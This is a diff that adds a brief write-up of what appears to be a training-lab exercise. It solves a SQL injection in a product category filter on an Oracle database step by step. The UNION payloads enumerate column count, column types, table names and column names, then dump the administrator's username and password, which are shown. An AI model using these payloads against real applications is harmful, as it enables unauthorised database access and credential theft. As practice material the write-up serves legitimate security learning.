@@ -1,0 +1,41 @@
+SQL Injection - Product category filter
+
+Main Goal: Find name of table and its column and login as administrator
+
+Analysis:
+
+(1) Find Number of column
+
+' order by 3--    -> internal server error
+
+3-1=2 column
+
+(2) find column data type
+
+' UNION select 'a','a' from dual--
+Both field are string type
+
+(3)Find table in database
+
+' UNION SELECT table_name,NULL FROM all_tables--
+
+Table Name: USERS_CXLQWU
+
+(4) Find column name of this table (USERS_CXLQWU)
+
+' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = 'USERS_CXLQWU'--
+
+USERNAME_SCVMDO
+PASSWORD_BBKGTU
+
+(5)Find administrator password 
+
+' UNION select USERNAME_SCVMDO, PASSWORD_BBKGTU from USERS_CXLQWU --
+
+administrator
+7pf43v3u2pnqjvay5fbx
+
+
+
+
+' UNION select USERNAME_TEFJGO, PASSWORD_XVCFIA from USERS_LNULEP --
